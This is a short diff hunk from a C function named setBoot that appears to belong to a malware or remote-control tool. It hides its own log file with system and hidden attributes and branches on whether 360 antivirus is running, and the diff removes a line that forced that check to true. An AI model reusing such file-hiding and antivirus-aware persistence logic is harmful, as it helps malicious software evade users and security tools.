@@ -271,7 +271,6 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 		iRet = makeFullFileName(strLogFilePath, LITTLEBEAR_LOG_FILE_NAME);
 		iRet = lpSetFileAttributesA(strLogFilePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);
 
-		b360Running = true;
 		if (b360Running)
 		{
 			iRet = GetApplicationInfo(TRUE);
